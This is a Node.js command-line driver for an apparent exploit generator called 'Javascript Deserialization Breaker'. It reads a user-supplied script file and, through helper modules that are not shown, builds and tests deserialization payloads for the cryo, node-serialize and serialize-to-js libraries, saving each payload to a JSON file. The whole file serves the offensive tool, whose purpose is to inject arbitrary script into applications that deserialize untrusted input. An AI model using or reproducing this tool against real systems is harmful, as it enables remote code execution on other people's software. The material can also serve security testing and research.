const myArgs = process.argv.slice(2);

var support_libraries = ['cryo', 'node-serialize', 'serialize-to-js']
var help = `
*** Javascript Deserialization Breaker ***    

Usage: breaker library overwriteMethod InsertScriptFile
support libraries: ${support_libraries.toString()}

==========================================
`


if(myArgs.length < 3){
    console.log("ERROR: not enough Parameters!")
    console.log(help)
    process.exit(1)
}

switch (myArgs[0]) {
    case 'cryo':
        var fs = require('fs')
        fs.readFile(myArgs[2],'utf8',function(error,data){
            if(error){
                console.log("ERROR: InsertScriptFile doesn't exist!")
            }else{
                var cryoGen = require('./lib/cryoGen')
                cryoGen.init(myArgs[1],data.toString())        
                var payload = cryoGen.genPayload()
                cryoGen.testPayload(payload)
                var filename = `${support_libraries[0]}_payload.json`
                fs.writeFile(filename, payload, (err) => {saveCallBack(err,filename)})
            }
        })    
        break;

    case 'node-serialize':
        var fs = require('fs');
        fs.readFile(myArgs[2],'utf8',function(error,data){
            if(error){
                console.log("ERROR: InsertScriptFile doesn't exist!")
            }else{
                var Gen = require('./lib/nodeSerializeGen')
                Gen.init(myArgs[1],data.toString())        
                var payload = Gen.genPayload()
                Gen.testPayload(payload)
                var filename = `${support_libraries[1]}_payload.json`
                fs.writeFile(filename, payload, (err) => {saveCallBack(err,filename)})            }
        })    
        break;

    case 'serialize-to-js':
        var fs = require('fs');
        fs.readFile(myArgs[2],'utf8',function(error,data){
            if(error){
                console.log("ERROR: InsertScriptFile doesn't exist!")
            }else{
                var Gen = require('./lib/serialize2jsGen')
                Gen.init(myArgs[1],data.toString())        
                var payload = Gen.genPayload()
                Gen.testPayload(payload)
                var filename = `${support_libraries[2]}_payload.json`
                fs.writeFile(filename, payload, (err) => {saveCallBack(err,filename)})            
            }
        })    
        break;

    default:
        console.log("ERROR: Please choose a supported vulnerable library!")
        console.log(help)
        break;
}


function saveCallBack(err,filename) {
    if(err) console.log("ERROR: Can't write payload into file"); 
    else console.log(`INFO: Saved the payload to ${filename}`)
}